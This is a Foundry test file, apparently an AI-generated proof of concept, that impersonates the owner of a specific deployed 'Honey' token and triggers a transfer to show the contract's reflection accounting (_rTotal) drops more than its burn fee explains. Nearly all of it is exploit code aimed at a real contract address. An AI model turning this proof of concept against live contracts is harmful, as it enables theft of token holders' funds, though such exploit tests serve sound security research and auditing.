pragma solidity ^0.8.0;

// Ensemble synthesis candidate.
// Selected source model: Gemini.
// Reviewed candidate models: Gemini, Qwen, Deepseek.

import "forge-std/Test.sol";

interface IHoney {
    function owner() external view returns (address);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function includeAccount(address account) external;
    function _BURN_FEE() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────


    address constant TARGET = 0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5;
    address attacker = address(this);
    IHoney private token;
    address private owner;

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IHoney(TARGET);
        owner = 0x323498334460D5B78034873b22B404d552C6f66A;
        address uniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

        uint256 initialAttackerBalance = 1_000_000 * 1e9;

        vm.startPrank(owner);
        // Clean up the excluded list to simplify rate calculation.
        // The contract was deployed with the Uniswap router as excluded.
        token.includeAccount(uniswapRouter);
        // Transfer initial tokens to the attacker.
        token.transfer(attacker, initialAttackerBalance);
        vm.stopPrank();

        assertTrue(IERC20(TARGET).balanceOf(attacker) > 0);
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        IHoney token = IHoney(TARGET);
                address realOwner = token.owner();
                address uniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
                uint256 initialAttackerBalance = 1_000_000 * 1e9;

                // Perform setup by impersonating the real owner
                vm.startPrank(realOwner);
                token.includeAccount(uniswapRouter);
                token.transfer(attacker, initialAttackerBalance);
                vm.stopPrank();

                // --- Exploit Phase ---
                uint256 transferAmount = 100_000 * 1e9;

                // --- Pre-computation for oracle ---
                uint256 rTotal_initial = uint256(vm.load(TARGET, bytes32(uint256(7))));
                uint256 tTotal_initial = uint256(vm.load(TARGET, bytes32(uint256(6))));

                uint256 rate = rTotal_initial / tTotal_initial;
                uint256 burnFee = token._BURN_FEE();
                uint256 tBurn = (transferAmount * burnFee) / 10000;
                uint256 rBurn = tBurn * rate;
                uint256 expected_rTotal = rTotal_initial - rBurn;

                // --- Trigger the exploit ---
                token.transfer(makeAddr("recipient"), transferAmount);

                // --- Verify the state change ---
                uint256 rTotal_final = uint256(vm.load(TARGET, bytes32(uint256(7))));

                assertLt(rTotal_final, expected_rTotal, "_rTotal was not reduced incorrectly");
    }





    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

